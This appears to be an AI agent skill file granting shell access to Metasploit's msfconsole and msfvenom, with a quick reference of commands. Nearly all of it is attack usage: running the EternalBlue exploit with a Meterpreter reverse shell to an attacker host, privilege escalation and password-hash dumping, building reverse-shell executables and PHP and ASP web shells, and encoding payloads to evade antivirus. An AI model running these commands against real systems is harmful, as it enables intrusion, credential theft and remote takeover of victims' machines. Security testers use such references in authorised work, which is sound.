---
name: metasploit-cli
description: "Metasploit Framework — платформа имитации угроз: msfconsole, msfvenom, вспомогательные сканеры. Бинарные файлы: /usr/bin/msfconsole, /usr/bin/msfvenom."
allowed-tools: Bash(msfconsole *), Bash(msfvenom *), Bash(msfdb *), Read
---

# metasploit-cli

Binaries: `/usr/bin/msfconsole` · `/usr/bin/msfvenom`

## msfconsole quick reference

```bash
# Start
msfconsole -q

# Inside msfconsole:
search type:exploit platform:windows name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target>
set LHOST <attacker-ip>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Session management
sessions -l
sessions -i 1

# Meterpreter common
sysinfo; getuid; getsystem; hashdump; run post/multi/recon/local_exploit_suggester
upload /path/file C:\\Windows\\Temp\\file
download C:\\file /local/path
shell; background

# Auxiliary scanners
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/http/http_login
```

## msfvenom payloads

```bash
# Windows stageless reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/reverse_php LHOST=<ip> LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f asp -o shell.asp

# List all payloads
msfvenom -l payloads | grep <keyword>

# Encode to bypass AV (basic; modern AV will still detect)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -e x64/xor_dynamic -i 3 -f exe -o encoded.exe
```
